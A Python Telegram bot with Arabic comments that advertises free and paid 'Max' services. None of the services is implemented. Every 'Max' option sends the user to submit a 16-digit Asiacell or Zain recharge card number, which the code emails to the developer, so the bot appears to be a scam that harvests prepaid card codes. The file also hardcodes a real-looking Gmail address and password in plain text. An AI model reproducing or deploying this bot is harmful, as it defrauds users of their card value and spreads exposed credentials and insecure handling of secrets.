import os
import telebot
from telebot import types
from flask import Flask
from threading import Thread
import smtplib
from email.message import EmailMessage

# الإعدادات
TOKEN = os.environ.get('TOKEN')
bot = telebot.TeleBot(TOKEN)
EMAIL_USER = 'asmtjryby678@gmail.com'
EMAIL_PASS = 'Fmaxma19981998@' # استبدلها بكلمة مرور التطبيق من Google

# --- دالة إرسال الإيميل ---
def send_email_to_dev(user_id, card_number, provider):
    try:
        msg = EmailMessage()
        msg['Subject'] = 'طلب تفعيل اشتراك ماكس جديد'
        msg['From'] = EMAIL_USER
        msg['To'] = EMAIL_USER
        msg.set_content(f"تفاصيل الطلب:\n\nالمستخدم: {user_id}\nالمزود: {provider}\nالرقم: {card_number}")
        
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_USER, EMAIL_PASS)
            smtp.send_message(msg)
    except Exception as e:
        print(f"Error sending email: {e}")

# --- معالجة الرسائل والأزرار ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("الاشتراك المجاني", callback_data='free_sub'),
               types.InlineKeyboardButton("اشتراك ماكس ✨", callback_data='max_sub'))
    bot.send_message(message.chat.id, "أهلاً بك في ✨ 𝓜𝓐𝓧 𝓑𝓞𝓞𝓣 ✨", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    # قائمة الاشتراك المجاني
    if call.data == 'free_sub':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(*[types.InlineKeyboardButton(f"مجاني {i}", callback_data=f'f{i}') for i in [1,2,3,5]])
        bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # قائمة ماكس
    elif call.data == 'max_sub':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(*[types.InlineKeyboardButton(f"ماكس {i}", callback_data=f'max_{i}') for i in range(1, 21)])
        bot.edit_message_text("اختر خدمة ماكس المطلوبة:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # عند الضغط على زر "ماكس 1-20"
    elif call.data.startswith('max_'):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("تفعيل ماكس ✨", callback_data='activate_max'))
        bot.edit_message_text("عذراً، أنت غير مشترك في خطة ماكس ✨", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # عند الضغط على "تفعيل ماكس"
    elif call.data == 'activate_max':
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(types.InlineKeyboardButton("🔴 Asiacell", callback_data='provider_asia'),
                   types.InlineKeyboardButton("🔵 Zain", callback_data='provider_zain'))
        bot.edit_message_text("اختر مزود الخدمة:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # اختيار المزود
    elif call.data.startswith('provider_'):
        provider = "آسياسيل" if call.data == 'provider_asia' else "زين"
        msg = bot.send_message(call.message.chat.id, f"تم اختيار {provider}.\nيرجى إرسال رقم البطاقة (16 رقماً فقط):")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

def get_card_number(message, provider):
    if message.text.isdigit() and len(message.text) == 16:
        bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً ليتم تفعيل الاشتراك من قبل المطور.")
        send_email_to_dev(message.chat.id, message.text, provider)
    else:
        msg = bot.reply_to(message, "خطأ! يرجى إرسال 16 رقماً فقط بدون حروف أو رموز.")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

# --- كود الاستيقاظ الدائم ---
app = Flask('')
@app.route('/')
def home(): return "البوت يعمل الآن!"
def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
if __name__ == "__main__":
    Thread(target=run).start()
    bot.infinity_polling()
